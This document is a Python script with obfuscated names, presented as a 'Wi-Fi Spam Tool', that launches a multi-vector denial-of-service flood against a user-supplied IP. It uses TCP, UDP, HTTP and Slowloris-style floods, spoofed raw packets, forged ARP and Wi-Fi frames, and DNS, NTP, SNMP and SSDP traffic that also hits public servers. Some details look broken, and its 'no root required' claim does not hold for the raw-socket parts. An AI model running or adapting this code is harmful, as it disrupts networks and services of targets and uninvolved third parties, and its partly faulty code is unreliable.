#⟡ RECURSIVE OUTPUT ⟡
#
#!/usr/bin/python3
# -*- coding: utf-8 -*-

import time,sys,socket,threading,random,os,signal,struct,binascii,urllib.request,ssl
from queue import Queue
from optparse import OptionParser

def a():
    global b
    b=[]
    b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
    b.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/16.1 Safari/605.1.15")
    b.append("Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0")
    b.append("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1")
    b.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36")
    b.append("Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0")
    b.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 Chrome/118.0.5993.88 Safari/537.36 OPR/104.0.4944.36")
    b.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0")
    b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0")
    b.append("Mozilla/5.0 (X11; CrOS aarch64 15717.0.0) AppleWebKit/537.36 Chrome/120.0.6099.216 Safari/537.36")
    b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.5938.92 Safari/537.36")
    b.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
    b.append("Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0")
    b.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 Chrome/116.0.5845.188 Safari/537.36")
    b.append("Mozilla/5.0 (Android 13; Mobile; rv:117.0) Gecko/117.0 Firefox/117.0")
    b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.5790.171 Safari/537.36")
    b.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 Version/14.0.3 Safari/605.1.15")
    b.append("Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.6045.159 Safari/537.36")
    b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.5735.199 Safari/537.36 OPR/100.0.4815.82")
    b.append("Mozilla/5.0 (X11; FreeBSD amd64; rv:117.0) Gecko/20100101 Firefox/117.0")
    return b

def c():
    global d
    d=[]
    d.append("http://validator.w3.org/check?uri=")
    d.append("http://www.facebook.com/sharer/sharer.php?u=")
    d.append("http://www.linkedin.com/shareArticle?url=")
    d.append("http://pinterest.com/pin/create/button/?url=")
    d.append("http://twitter.com/intent/tweet?url=")
    return d

def e():
    return os.urandom(random.randint(32768, 131072))

def f():
    g = os.urandom(random.randint(131072, 524288))
    h = ("POST / HTTP/1.1\r\nHost: " + l + "\r\nUser-Agent: " + random.choice(b) + "\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache, no-store, must-revalidate\r\nContent-Length: " + str(len(g)) + "\r\nContent-Type: application/octet-stream\r\nConnection: keep-alive\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n").encode() + g
    return h

def i():
    j = os.urandom(random.randint(65536, 262144))
    k = struct.pack("!HHHHHH", random.randint(0,65535), 0x0100, random.randint(1,10), 0, 0, 0) + b"\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + j
    return k

def m():
    n = os.urandom(random.randint(4096, 16384))
    o = b"\x45\x00" + struct.pack("!H", 20 + len(n)) + b"\x00\x01\x00\x00\x40\x01\x00\x00" + socket.inet_aton(".".join(str(random.randint(1,254)) for _ in range(4))) + socket.inet_aton(l)
    p = b"\x08\x00\x00\x00\x00\x00" + n
    return o + p

def q():
    return b"\x17\x00\x03\x2a" + b"\x00" * 12 + os.urandom(random.randint(8192, 65536))

def r():
    s = os.urandom(random.randint(16384, 98304))
    t = b"\x30" + bytes([len(s) + 20]) + b"\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa0" + bytes([len(s) + 10]) + b"\x02\x04" + struct.pack("!I", random.randint(0,4294967295)) + b"\x02\x04" + struct.pack("!I", random.randint(0,4294967295)) + b"\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00" + s
    return t

def u():
    return b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: " + str(random.randint(1,10)).encode() + b"\r\nST: upnp:rootdevice\r\nUSER-AGENT: " + random.choice(b).encode() + b"\r\n\r\n" + os.urandom(random.randint(32768, 196608))

def v():
    w = 0x00C0
    x = struct.pack("!HH6s6s6sHH", w, 0, bytes([0x00,0x1A,0x2B,0x3C,0x4D,0x5E]), bytes([0xAA,0xBB,0xCC,0xDD,0xEE,0xFF]), bytes([0x00,0x1A,0x2B,0x3C,0x4D,0x5E]), random.randint(0,4095), 0x0007, 0x0000)
    y = binascii.crc32(struct.pack("!H", w) + x[2:]) & 0xFFFFFFFF
    return x + struct.pack("!I", y) + b"\x00\x04" + os.urandom(4)

def z():
    try:
        while True:
            aa = f()
            ab = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ab.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            ab.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            ab.settimeout(2)
            ab.connect((l, int(ac)))
            ab.sendall(aa)
            try:
                ab.settimeout(0.005)
                ab.recv(8192)
            except:
                pass
            try:
                ab.shutdown(socket.SHUT_RDWR)
                ab.close()
            except:
                pass
            time.sleep(0.0005)
    except:
        time.sleep(0.0005)

def ad():
    try:
        while True:
            ae = e()
            af = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            af.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            af.sendto(ae, (l, int(ac)))
            af.close()
            time.sleep(0.0003)
    except:
        time.sleep(0.0003)

def ag():
    ah = []
    try:
        for _ in range(3000):
            try:
                ai = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ai.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                ai.settimeout(3)
                ai.connect((l, int(ac)))
                ai.send(("GET / HTTP/1.1\r\nHost: " + l + "\r\nUser-Agent: " + random.choice(b) + "\r\nAccept: text/html\r\n").encode())
                ah.append(ai)
            except:
                pass
        while True:
            for ai in list(ah):
                try:
                    ai.send(("X-Header: " + random.choice(b) + "\r\n").encode())
                except:
                    ah.remove(ai)
                    try:
                        aj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        aj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        aj.settimeout(3)
                        aj.connect((l, int(ac)))
                        aj.send(("GET / HTTP/1.1\r\nHost: " + l + "\r\nUser-Agent: " + random.choice(b) + "\r\nAccept: text/html\r\n").encode())
                        ah.append(aj)
                    except:
                        pass
            time.sleep(15)
    except:
        for ai in ah:
            try:
                ai.close()
            except:
                pass

def ak():
    try:
        while True:
            al = random.choice(d) + "http://" + l
            am = urllib.request.Request(al, headers={'User-Agent': random.choice(b)})
            urllib.request.urlopen(am, timeout=2)
            time.sleep(0.001)
    except:
        time.sleep(0.001)

def an():
    try:
        while True:
            ao = i()
            ap = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ap.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            ap.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            ap.sendto(ao, (l, 53))
            ap.sendto(ao, ("8.8.8.8", 53))
            ap.sendto(ao, ("1.1.1.1", 53))
            ap.close()
            time.sleep(0.0003)
    except:
        time.sleep(0.0003)

def aq():
    try:
        while True:
            ar = q()
            as_ = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            as_.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            as_.sendto(ar, (l, 123))
            as_.sendto(ar, ("pool.ntp.org", 123))
            as_.sendto(ar, ("time.google.com", 123))
            as_.close()
            time.sleep(0.0003)
    except:
        time.sleep(0.0003)

def at():
    try:
        while True:
            au = u()
            av = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            av.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            av.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 64)
            av.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            av.sendto(au, ("239.255.255.250", 1900))
            av.sendto(au, ("224.0.0.1", 1900))
            av.sendto(au, ("255.255.255.255", 1900))
            av.close()
            time.sleep(0.0003)
    except:
        time.sleep(0.0003)

def aw():
    try:
        while True:
            ax = r()
            ay = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ay.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            ay.sendto(ax, (l, 161))
            ay.sendto(ax, ("127.0.0.1", 161))
            ay.close()
            time.sleep(0.0003)
    except:
        time.sleep(0.0003)

def az():
    try:
        while True:
            ba = m()
            bb = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            bb.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            bb.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            bb.sendto(ba, (l, 0))
            bb.close()
            time.sleep(0.0003)
    except:
        time.sleep(0.0003)

def bc():
    try:
        while True:
            bd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            bd.settimeout(1)
            bd.connect((l, int(ac)))
            bd.send(b"GET / HTTP/1.1\r\nHost: " + l.encode() + b"\r\nConnection: keep-alive\r\n\r\n")
            be = []
            for _ in range(500):
                bf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                bf.settimeout(1)
                bf.connect((l, int(ac)))
                be.append(bf)
            for bf in be:
                try:
                    bf.send(b"GET /" + os.urandom(256).hex().encode() + b" HTTP/1.1\r\nHost: " + l.encode() + b"\r\n\r\n")
                except:
                    pass
            time.sleep(0.0003)
    except:
        pass

def bg():
    bh = []
    try:
        while True:
            for _ in range(500):
                bh.append(open("/dev/null", "r"))
                bh.append(open("/proc/self/status", "r"))
                bh.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
            time.sleep(0.01)
    except:
        pass

def bi():
    bj = []
    try:
        while True:
            bj.append(os.urandom(1024*1024*50))
            time.sleep(0.001)
    except:
        pass

def bk():
    try:
        while True:
            bl = v()
            for bm in ["wlan0", "wlan1", "mon0", "ath0"]:
                try:
                    bn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
                    bn.bind((bm, 0))
                    bn.send(bl)
                    bn.close()
                except:
                    pass
            time.sleep(0.0003)
    except:
        pass

def bo():
    try:
        while True:
            bp = b"\x00"*6 + b"\xff"*6 + struct.pack("!H", 0x0806) + struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + b"\x00"*6 + socket.inet_aton(l) + b"\xff"*6 + socket.inet_aton("192.168.1.1")
            bq = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
            bq.bind(("eth0", 0))
            bq.send(bp)
            bq.close()
            time.sleep(0.001)
    except:
        pass

def br():
    try:
        while True:
            bs = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            bs.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            bt = socket.inet_aton(".".join(str(random.randint(1,254)) for _ in range(4)))
            bu = socket.inet_aton(l)
            bv = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(1,65535), 0, 64, 6, 0, bt, bu)
            bw = struct.pack("!HHLLBBHHH", random.randint(1024,65535), int(ac), random.randint(0,4294967295), 0, 5<<4, 0x04, 1024, 0, 0)
            bs.sendto(bv + bw, (l, int(ac)))
            bs.close()
            time.sleep(0.0003)
    except:
        time.sleep(0.0003)

def bx():
    try:
        while True:
            by = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            by.settimeout(1)
            by.connect((l, int(ac)))
            bz = ssl.create_default_context()
            bz.check_hostname = False
            bz.verify_mode = ssl.CERT_NONE
            ca = bz.wrap_socket(by, server_hostname=l)
            ca.send(b"GET / HTTPS/1.1\r\nHost: " + l.encode() + b"\r\n\r\n")
            ca.close()
            time.sleep(0.0003)
    except:
        pass

def cb():
    try:
        while True:
            cc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            cc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            cc.connect((l, int(ac)))
            for _ in range(1000):
                cc.send(b"GET /" + os.urandom(64).hex().encode() + b" HTTP/1.1\r\nHost: " + l.encode() + b"\r\nConnection: Keep-Alive\r\n\r\n")
            cc.close()
            time.sleep(0.001)
    except:
        pass

def cd():
    try:
        while True:
            with open("/proc/sys/net/ipv4/tcp_syncookies", "w") as ce:
                ce.write("0")
            with open("/proc/sys/net/ipv4/tcp_tw_reuse", "w") as ce:
                ce.write("0")
            with open("/proc/sys/net/ipv4/tcp_tw_recycle", "w") as ce:
                ce.write("0")
            with open("/proc/sys/net/core/somaxconn", "w") as ce:
                ce.write("0")
            with open("/proc/sys/net/ipv4/tcp_max_syn_backlog", "w") as ce:
                ce.write("0")
            time.sleep(0.001)
    except:
        pass

def cf():
    while True:
        cg = ch.get()
        z()
        ch.task_done()

def ci():
    while True:
        cg = cj.get()
        ad()
        cj.task_done()

def ck():
    while True:
        cg = cl.get()
        ak()
        cl.task_done()

def cm():
    while True:
        cg = cn.get()
        ag()
        cn.task_done()

def co():
    while True:
        cg = cp.get()
        an()
        cp.task_done()

def cq():
    while True:
        cg = cr.get()
        aq()
        cr.task_done()

def cs():
    while True:
        cg = ct.get()
        at()
        ct.task_done()

def cu():
    while True:
        cg = cv.get()
        aw()
        cv.task_done()

def cw():
    while True:
        cg = cx.get()
        az()
        cx.task_done()

def cy():
    while True:
        cg = cz.get()
        bc()
        cz.task_done()

def da():
    while True:
        cg = db.get()
        bg()
        db.task_done()

def dc():
    while True:
        cg = dd.get()
        bi()
        dd.task_done()

def de():
    while True:
        cg = df.get()
        bk()
        df.task_done()

def dg():
    while True:
        cg = dh.get()
        bo()
        dh.task_done()

def di():
    while True:
        cg = dj.get()
        br()
        dj.task_done()

def dk():
    while True:
        cg = dl.get()
        bx()
        dl.task_done()

def dm():
    while True:
        cg = dn.get()
        cb()
        dn.task_done()

def do():
    while True:
        cg = dp.get()
        cd()
        dp.task_done()

def dq():
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[!] CTRL+C detected - stopping")
        sys.exit(0)

def dr():
    print('''    
 Wi-Fi Spam Tool - No Root Required
    
 usage: python3 spam.py -s <ip> [-p <port>] [-t <threads>] [-m <mode>]
    -h : help
    -s : target ip address
    -p : target port (default 80)
    -t : thread multiplier (default 1000)
    -m : mode (tcp/udp/both/http/dns/ntp/ssdp/snmp/icmp/full) default full''')
    sys.exit()

def ds():
    global l, ac, ez, fb
    optp = OptionParser(add_help_option=False)
    optp.add_option("-s", "--server", dest="l")
    optp.add_option("-p", "--port", type="int", dest="ac")
    optp.add_option("-t", "--turbo", type="int", dest="ez")
    optp.add_option("-h", "--help", dest="dt", action='store_true')
    optp.add_option("-m", "--mode", dest="fb")
    opts, args = optp.parse_args()
    if opts.dt:
        dr()
    if opts.l is None:
        dr()
    l = opts.l
    ac = opts.ac if opts.ac is not None else 80
    ez = opts.ez if opts.ez is not None else 1000
    fb = opts.fb if opts.fb is not None else "full"

ch = Queue()
cj = Queue()
cl = Queue()
cn = Queue()
cp = Queue()
cr = Queue()
ct = Queue()
cv = Queue()
cx = Queue()
cz = Queue()
db = Queue()
dd = Queue()
df = Queue()
dh = Queue()
dj = Queue()
dl = Queue()
dn = Queue()
dp = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        dr()
    ds()
    a()
    c()
    print(l, "port:", ac, "threads:", ez, "mode:", fb)
    time.sleep(1)
    signal.signal(signal.SIGINT, lambda du, dv: sys.exit(0))
    try:
        dw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dw.settimeout(1)
        dw.connect((l, int(ac)))
        dw.close()
    except:
        pass
    if fb in ["tcp", "both", "full"]:
        for _ in range(int(ez)):
            dx = threading.Thread(target=cf)
            dx.daemon = True
            dx.start()
    if fb in ["udp", "both", "full"]:
        for _ in range(int(ez/2)):
            dx = threading.Thread(target=ci)
            dx.daemon = True
            dx.start()
    if fb in ["http", "full"]:
        for _ in range(int(ez/3)):
            dx = threading.Thread(target=ck)
            dx.daemon = True
            dx.start()
        for _ in range(int(ez/6)):
            dx = threading.Thread(target=cm)
            dx.daemon = True
            dx.start()
    if fb in ["dns", "full"]:
        for _ in range(int(ez/4)):
            dx = threading.Thread(target=co)
            dx.daemon = True
            dx.start()
    if fb in ["ntp", "full"]:
        for _ in range(int(ez/4)):
            dx = threading.Thread(target=cq)
            dx.daemon = True
            dx.start()
    if fb in ["ssdp", "full"]:
        for _ in range(int(ez/4)):
            dx = threading.Thread(target=cs)
            dx.daemon = True
            dx.start()
    if fb in ["snmp", "full"]:
        for _ in range(int(ez/4)):
            dx = threading.Thread(target=cu)
            dx.daemon = True
            dx.start()
    if fb in ["icmp", "full"]:
        for _ in range(int(ez/3)):
            dx = threading.Thread(target=cw)
            dx.daemon = True
            dx.start()
    if fb in ["full"]:
        for _ in range(int(ez/8)):
            dx = threading.Thread(target=cy)
            dx.daemon = True
            dx.start()
            dx = threading.Thread(target=da)
            dx.daemon = True
            dx.start()
            dx = threading.Thread(target=dc)
            dx.daemon = True
            dx.start()
            dx = threading.Thread(target=de)
            dx.daemon = True
            dx.start()
            dx = threading.Thread(target=dg)
            dx.daemon = True
            dx.start()
            dx = threading.Thread(target=di)
            dx.daemon = True
            dx.start()
            dx = threading.Thread(target=dk)
            dx.daemon = True
            dx.start()
            dx = threading.Thread(target=dm)
            dx.daemon = True
            dx.start()
            dx = threading.Thread(target=do)
            dx.daemon = True
            dx.start()
    dy = threading.Thread(target=dq)
    dy.daemon = True
    dy.start()
    while True:
        for _ in range(int(ez)):
            if fb in ["tcp", "both", "full"]:
                ch.put(_)
            if fb in ["udp", "both", "full"]:
                cj.put(_)
            if fb in ["http", "full"]:
                cl.put(_)
                cn.put(_)
            if fb in ["dns", "full"]:
                cp.put(_)
            if fb in ["ntp", "full"]:
                cr.put(_)
            if fb in ["ssdp", "full"]:
                ct.put(_)
            if fb in ["snmp", "full"]:
                cv.put(_)
            if fb in ["icmp", "full"]:
                cx.put(_)
            if fb in ["full"]:
                cz.put(_)
                db.put(_)
                dd.put(_)
                df.put(_)
                dh.put(_)
                dj.put(_)
                dl.put(_)
                dn.put(_)
                dp.put(_)
        time.sleep(0.00005)
